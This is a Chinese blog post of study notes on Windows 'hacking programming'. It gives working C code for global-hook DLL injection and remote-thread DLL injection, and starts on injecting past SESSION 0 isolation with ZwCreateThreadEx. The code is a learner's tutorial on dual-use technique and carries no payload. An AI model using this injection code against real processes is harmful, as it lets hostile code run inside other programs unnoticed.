<!DOCTYPE html>
<html lang="zh-cn" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="郁涛丶" />
  <meta name="description" content="" />
  
  
  <title>
    
      Windows Program Learn_0x1 
      
      
      |
    
     郁涛丶&#39;s Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="郁涛丶's Blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Ghostasky</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


    <!-- LaTex Display -->

  
    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>


        
            
                <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>



                    
                        
                                
                                        
                                                
                                                        
                                                            <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
                                                            <div class="container post-details" id="post-details">
                                                                <div class="post-content">
                                                                    <div class="post-title">
                                                                        Windows Program Learn_0x1
                                                                    </div>
                                                                    <div class="post-attach">
                                                                        <span class="post-pubtime">
        <i class="iconfont icon-updatetime" title="Update time"></i>
        2022-10-10
      </span>

                                                                        <span class="post-pubtime"> 本文共4.9k字 </span>

                                                                        <span class="post-pubtime">
        大约需要28min
      </span>

                                                                        
                                                                                    <span class="post-categories">
        <i class="iconfont icon-bookmark" title="Categories"></i>
        
        <span class="span--category">
          <a href="/categories/Technology/" title="Technology">
            <b>#</b> Technology
          </a>
        </span>
                                                                                    
                                                                                        </span>
                                                                                        
                                                                            <span class="post-tags">
        <i class="iconfont icon-tags" title="Tags"></i>
        
        <span class="span--tag">
          <a href="/tags/Win32/" title="Win32">
            <b>#</b> Win32
          </a>
        </span>
                                                                            
                                                                                </span>
                                                                                
                                                                    </div>
                                                                    <div class="markdown-body">
                                                                        <p>[toc]</p>
<p>准备开个系列，就叫“Windows Program Learn”，记录《Windows黑客编程技术详解》书的代码和笔记。</p>
<blockquote>
<p>https://github.com/jash-git/Windows-Hack-Programming-backup</p>
</blockquote>
<h1 id="基础">基础</h1>
<p>最开始是环境的搭建，这里就不搞了，好像也没啥。</p>
<h2 id="单一实例">单一实例</h2>
<p>也就是实现进程互斥。</p>
<h3 id="createmutexa">CreateMutexA</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutexA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpMutexAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOL                  bInitialOwner,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPCSTR                lpName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>参数：</p>
<ul>
<li><p><code>lpMutexAttributes</code>：指向 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)">SECURITY_ATTRIBUTES</a>结构的指针。如果此参数为<code>NULL</code>，则句柄不能被子进程继承。</p>
<p>结构的<strong>lpSecurityDescriptor</strong>成员指定新互斥体的安全描述符。如果<code>lpMutexAttributes</code>为<code>NULL</code>，则互斥锁将获得默认的安全描述符。</p></li>
<li><p><code>bInitialOwner</code>：如果此值为<strong>TRUE</strong>并且调用者创建了互斥锁，则调用线程将获得互斥锁对象的初始所有权。否则，调用线程不会获得互斥锁的所有权。</p></li>
<li><p><code>lpName</code>：互斥对象的名称。</p></li>
</ul>
<p>返回值：</p>
<ul>
<li>如果函数成功，则返回值是新创建的互斥对象的句柄。</li>
<li>如果函数失败，则返回值为<strong>NULL</strong>。</li>
<li>如果互斥锁是一个命名互斥锁并且该对象在此函数调用之前存在，则返回值是现有对象的句柄，并且<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>函数返回<code>ERROR_ALREADY_EXISTS</code>。</li>
</ul>
<blockquote>
<p>进程、线程、文件、互斥体、事件等等在内核都有一个对应的结构体，这些结构体都由内核负责管理，所以我们都可以称之为内核对象。</p>
<p>只有进程才会有句柄表，并且<strong>每一个进程都会有一个句柄表</strong>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">IsAlreadyRun</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hMutex = <span class="literal">NULL</span>;</span><br><span class="line">    hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, TEXT(<span class="string">&quot;TEST&quot;</span>));<span class="comment">//TEST需要唯一</span></span><br><span class="line">    <span class="keyword">if</span> (hMutex)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ERROR_ALREADY_EXISTS == ::GetLastError())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="注入">注入</h1>
<p>内容</p>
<ul>
<li>全局钩子</li>
<li>远程线程钩子</li>
<li>突破SESSION 0隔离的远程线程注入</li>
<li>APC注入</li>
</ul>
<h2 id="全局钩子">全局钩子</h2>
<blockquote>
<p>ok，这里搞了两天终于搞通了，搞个虚拟机在里面写吧，，差点给电脑干出问题。。。</p>
</blockquote>
<p>Windows系统中，大部分的应用程序都是基于消息机制的，它们都有一个消息过程函数，根据不同的消息完成不同的功能。</p>
<p>Windows操作系统提供的钩子机制就是用来截获和监控系统中这些消息的。</p>
<p>按照钩子作用的范围不同，它们分为局部钩子和全局钩子。</p>
<ul>
<li>局部钩子： 针对某个线程的</li>
<li>全部钩子： 针对整个系统基于消息的应用，需要使用DLL文件，在DLL中实现相应的钩子函数</li>
</ul>
<h3 id="api">API</h3>
<h4 id="setwindowshookexa">SetWindowsHookExA</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK <span class="title">SetWindowsHookExA</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    [in] <span class="keyword">int</span> idHook,      <span class="comment">//要安装的钩子程序的类型，具体见官方文档</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HOOKPROC lpfn,   <span class="comment">//指向挂钩过程的指针。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] HINSTANCE hmod,  <span class="comment">//包含lpfn参数指向的钩子过程的 DLL 句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">    [in] DWORD dwThreadId <span class="comment">//与挂钩过程关联的线程的标识符。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>成功，则返回值是钩子过程的句柄。</li>
<li>失败，则返回值为<strong>NULL</strong></li>
</ul>
<h3 id="实现">实现</h3>
<p>全局钩子的话那钩子函数就必须在DLL中，这样才能“全局”，懂吧？</p>
<p>在操作系统中安装全局钩子后，只要进程接收到可以发出钩子的消息，全局钩子的DLL文件就会由操作系统自动或强行地加载到该进程中。创建一个全局钩子后，在对应事件发生时，系统就会把DLL加载到发生事件的进程中，从而实现DLL注入。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 钩子回调函数</span></span><br><span class="line"><span class="function">LRESULT MYWINDAPIEXPORT <span class="title">GetMsgProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	<span class="keyword">int</span> code,</span></span></span><br><span class="line"><span class="params"><span class="function">	WPARAM wParam,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Messagebox(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> ::CallNextHookEx(g_hHook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置全局钩子</span></span><br><span class="line"><span class="function">BOOL MYWINDAPIEXPORT <span class="title">SetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//</span></span><br><span class="line">	g_hHook = ::SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, GetModuleHandle(TEXT(<span class="string">&quot;MyDLL.dll&quot;</span>)) , <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook %d\n&quot;</span>,(<span class="keyword">int</span>&amp;)g_hHook);</span><br><span class="line">	<span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>)</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> MYWINDAPIEXPORT <span class="title">UnsetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook %d\n&quot;</span>, (<span class="keyword">int</span>&amp;)g_hHook);</span><br><span class="line">	UnhookWindowsHookEx(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如何将钩子句柄传递给其他进程？ 可以在DLL中创建共享内存。共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，相当 于多个进程共享一个内存。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HMODULE g_hDllModule;</span><br><span class="line"><span class="comment">// 共享内存</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">    HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)<span class="comment">//设置可读可写可共享</span></span></span><br></pre></td></tr></table></figure>
<p>成功装载hook：</p>
<figure>
<img src="/2022/10/10/2022-9-WinCode1/image-20220923221139302.png" alt="image-20220923221139302"><figcaption aria-hidden="true">image-20220923221139302</figcaption>
</figure>
<h2 id="远程线程注入dll">远程线程注入DLL</h2>
<p>就是在另一个进程中创建线程。</p>
<h3 id="api-1">API</h3>
<h4 id="openprocess">OpenProcess</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwDesiredAccess,<span class="comment">//对进程对象的访问</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] BOOL  bInheritHandle,<span class="comment">//如果该值为 TRUE，则由该进程创建的进程将继承句柄。否则，进程不会继承此句柄。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] DWORD dwProcessId<span class="comment">//要打开的本地进程的标识符</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>如果函数成功，则返回值是指定进程的打开句柄。</li>
<li>如果函数失败，则返回值为 NULL。要获取扩展的错误信息，请调用 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</li>
</ul>
<h4 id="virtualallocex">VirtualAllocEx</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPVOID <span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HANDLE hProcess,<span class="comment">//进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPVOID lpAddress,<span class="comment">//为要分配的页面区域指定所需起始地址的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flAllocationType,<span class="comment">//内存分配的类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD  flProtect<span class="comment">//要分配的页面区域的内存保护</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值</p>
<ul>
<li>如果函数成功，则返回值是分配的页面区域的基地址。</li>
<li>如果函数失败，则返回值为<strong>NULL</strong>。要获取扩展的错误信息，请调用<a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a></li>
</ul>
<h4 id="writeprocessmemory">WriteProcessMemory</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE  hProcess,<span class="comment">//要修改的进程内存的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID  lpBaseAddress,<span class="comment">//指向要写入数据的指定进程中的基地址的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPCVOID lpBuffer,<span class="comment">//指向缓冲区的指针,要写入的数据</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T  nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] SIZE_T  *lpNumberOfBytesWritten<span class="comment">//可选，指向变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>如果函数成功，则返回值非零。</li>
<li>如果函数失败，则返回值为 0（零）。</li>
</ul>
<h4 id="createremotethread">CreateRemoteThread</h4>
<p>在另一个进程创建线程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE                 hProcess,<span class="comment">//进程的句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<span class="comment">//指向 SECURITY_ATTRIBUTES结构的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  SIZE_T                 dwStackSize,<span class="comment">//堆栈的初始大小，以字节为单位</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="comment">//指向要由线程执行的LPTHREAD_START_ROUTINE 类型的应用程序定义函数的指针，表示远程进程中线程的起始地址。该函数必须存在于远程进程中。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  LPVOID                 lpParameter,<span class="comment">//指向要传递给线程函数的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD                  dwCreationFlags,<span class="comment">//控制线程创建的标志</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPDWORD                lpThreadId<span class="comment">//指向接收线程标识符的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>返回值：</p>
<ul>
<li>如果函数成功，则返回值是新线程的句柄。</li>
<li>如果函数失败，则返回值为<strong>NULL</strong>。</li>
</ul>
<h3 id="实现-1">实现</h3>
<p>使用<code>LoadLibrary</code>加载DLL，使用<code>VirtualAllocEx</code>在目标进程创建空间，使用<code>WriteProcessMemory</code>将指定的DLL路径写到指定进程空间，使用<code>CreateRemoteThread</code>在目标进程创建线程，完成线程注入DLL</p>
<ul>
<li>OpenProcess</li>
<li>VirtualAllocEx</li>
<li>WriteProcessMemory</li>
<li>GetProcAddress</li>
<li>CreateRemoteThread</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CreaeteRemoteThreadInjectDLL</span><span class="params">(DWORD dwprocessId,<span class="keyword">char</span>* pszDLLFilename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">	SIZE_T dwSize = <span class="number">0</span>;</span><br><span class="line">	LPVOID pDLLAddr = <span class="literal">NULL</span>;</span><br><span class="line">	FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line">	HANDLE hRemoteThread = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//PROCESS_ALL_ACCESS: 进程对象的所有可能访问权限</span></span><br><span class="line">	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwprocessId);</span><br><span class="line">	<span class="keyword">if</span> (!hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	dwSize = <span class="number">1</span> + <span class="built_in">strlen</span>(pszDLLFilename);</span><br><span class="line">	<span class="comment">//MEM_COMMIT: 为指定的保留内存页面分配内存，初始化为0</span></span><br><span class="line">	pDLLAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!pDLLAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (FALSE == WriteProcessMemory(hProcess,pDLLAddr,pszDLLFilename,dwSize,<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pFuncProcAddr)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDLLAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">mian():</span><br><span class="line">	BOOL res = CreaeteRemoteThreadInjectDLL(<span class="number">18556</span>, (<span class="keyword">char</span>*)<span class="string">&quot;E:\\B\\win32Code\\Chapter3\\Project4\\x64\\Debug\\CreateRemoteThreadDLL.dll&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>成功远程线程注入：</p>
<p><img src="/2022/10/10/2022-9-WinCode1/image-20221010221215587.png"></p>
<h2 id="突破session-0隔离的远线程注入">突破SESSION 0隔离的远线程注入</h2>
<p>如果上面的远线程注入对于系统的一些服务注入的话会失败，这是由于系统存在SESSION 0隔离的安全机制。</p>
<p>可以使用<code>ZwCreateThreadEx</code>进行远线程注入，还可以突破SESSION0隔离。</p>
<p>简单看下SESSION0隔离：<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/previous-versions/ee663077(v=msdn.10)?redirectedfrom=MSDN">SESSION0隔离</a>，<a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/previous-versions/msdn10/Ee791007(v=MSDN.10)">SESSION0隔离</a></p>
<p>Windows Vista之前：</p>
<figure>
<img src="/2022/10/10/2022-9-WinCode1/ee791007.image2(zh-cn,msdn.10).png" alt="img"><figcaption aria-hidden="true">img</figcaption>
</figure>
<p>之后：</p>
<figure>
<img src="/2022/10/10/2022-9-WinCode1/ee791007.image3(zh-cn,msdn.10).png" alt="img"><figcaption aria-hidden="true">img</figcaption>
</figure>
<h3 id="api-2">API</h3>
<h4 id="zwcreatethreadex">ZwCreateThreadEx</h4>
<p>其实这个不应该放到API这个标题下面的，因为微软其实并没有给出文档，在ntdll.dll中并没有声明，需要GetProcAddress导出。</p>
<p>其实<code>CreateRemoteThread</code>最终底层调用的就是<code>ZwCreateThreadEx</code>，在内核6.0后引入会话隔离机制。他在创建一个进城后不立即执行，而是挂起，也就是第七个参数<code>CreateSuspended</code>为1，从而导致DLL注入失败。（所以说置0就行了。</p>
<p>函数声明（注意32位与64位的声明是有区别的）：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI *typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	ULONG CreateThreadFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T ZeroBits,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T StackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	SIZE_T MaximumStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI *typedef_ZwCreateThreadEx)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	PHANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID ObjectAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">	HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">	BOOL CreateSuspended,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw1,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD dw2,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID pUnkown)</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
